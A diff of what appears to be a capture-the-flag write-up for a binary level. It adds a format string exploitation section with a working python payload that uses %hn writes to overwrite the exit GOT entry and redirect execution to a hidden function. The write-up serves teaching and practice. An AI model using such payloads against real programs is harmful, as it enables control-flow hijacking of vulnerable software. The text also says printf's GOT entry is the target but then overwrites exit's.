@@ -124,33 +124,7 @@ o()
 ```
 
 
-
-## 6. Why `printf(buffer)` is important
-
-A safe usage would be:
-
-```c
-printf("%s", buffer);
-```
-
-However, the program uses:
-
-```c
-printf(buffer);
-```
-
-This means the contents of `buffer` are interpreted as the **format string** itself.
-
-For example, if the input contains:
-
-```text
-%x %x %x
-```
-
-`printf` interprets those as format specifiers rather than printing them literally.
-
-
-## 7 GOT entries (Global Offset Table)
+## 6 GOT entries (Global Offset Table)
 
 after searching about the printf and how it can help us, we found something named GOT entries (Global Offset Table).
 
@@ -161,3 +135,68 @@ so the exection flow becomes like that
 ```bash
 call printf@PLT → jump to GOT entry → real printf()
 ```
+
+## 7 . Exploitation strategy
+
+the printf function is called in the function n and the input is passed directly to it, so we can use the format string vulnerability to overwrite the GOT entry of printf with the address of o function.
+
+how we can do that is by using the `%n` format specifier to write the number of bytes printed so far to a specific memory address, but there is a problem the address of o() is to large to be written in one go, so we need to split it into two parts and write them separately.
+
+```bash
+0x080484a4 = 134,513,828 (decimal)
+```
+
+Solution: Split the write (%hn technique)
+
+To solve this, we split the address into two 16-bit parts:
+```bash
+Upper half: 0x0804
+Lower half: 0x84a4
+```
+
+We use %hn which writes 2 bytes at a time.
+
+Target locations (GOT entries)
+
+We target the memory location of:
+```bash 
+exit@GOT = 0x08049838
+```
+
+We place two addresses in input:
+
+0x08049838
+0x0804983a
+
+Each will receive half of the address of o().
+
+
+to fetch the address of exit() in the global offset table we do
+
+```bash
+objdump -R ./level5 | grep exit ==> 0x08049838
+```
+
+the final to overwrite the exit@GOT with the address of o() is:
+
+```bash
+(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044c" + "%4$hn" + "%31904c" + "%5$hn"'; cat) | ./level5
+```
+
+Addresses and format-string writes
+
+- `\x3a\x98\x04\x08` (Address 1): the little-endian bytes for `0x0804983a` — the upper 2 bytes of the `exit` GOT entry. Placed first in the payload, this lands at stack offset 4.
+
+- `\x38\x98\x04\x08` (Address 2): the little-endian bytes for `0x08049838` — the lower 2 bytes of the `exit` GOT entry. Placed second, this lands at stack offset 5.
+
+Write steps (using `%hn` to write 2 bytes at a time):
+
+1. `%2044c` — pad the output so the printf character counter reaches 2052 bytes (0x0804). Note: the two address bytes at the start already consume 8 printed bytes, so the padding value is chosen accordingly.
+
+2. `%4$hn` — write the current count (2052) to the address at stack offset 4 (Address 1). This overwrites the upper half of the `exit` GOT entry with `0x0804`.
+
+3. `%31904c` — continue padding so the total printed count reaches 33956 bytes (0x84a4).
+
+4. `%5$hn` — write the new total (33956) to the address at stack offset 5 (Address 2). This overwrites the lower half of the `exit` GOT entry with `0x84a4`.
+
+After these writes the two 16-bit halves combine into the 32-bit address `0x080484a4` (the address of `o()`), so subsequent calls through the `exit` GOT will jump to `o()`.
